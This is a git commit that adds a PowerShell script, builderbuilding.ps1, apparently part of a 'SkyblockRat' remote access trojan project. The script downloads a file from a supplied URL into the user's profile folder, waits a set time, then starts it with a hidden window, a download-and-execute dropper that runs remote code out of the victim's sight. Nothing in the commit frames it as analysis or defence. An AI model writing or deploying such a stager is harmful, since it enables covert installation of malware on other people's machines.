49de706c2b4423f14bb210b29b83dac33ffc0679
rat <112645929+iLoveRat@users.noreply.github.com>
2023-07-27 23:15:29 +0200

    Create builderbuilding.ps1

---
+++ builderbuilding.ps1
@@ -0,0 +1,21 @@
+function run {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$True)]
+    [string]$urltofile,
+    [parameter(Position=1,Mandatory=$True)]
+    [string]$filenamea,
+    [parameter(Position=2,Mandatory=$True)]
+    [string]$waittime
+)
+
+    $outpath = "C:\Users\$env:username\SkyblockRat-main"
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $urltofile -OutFile $outpath
+
+    $args = "/filename C:\Users\$env:username\SkyblockRat-main"
+    
+    Start-Sleep -seconds $waittime
+    Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
+}
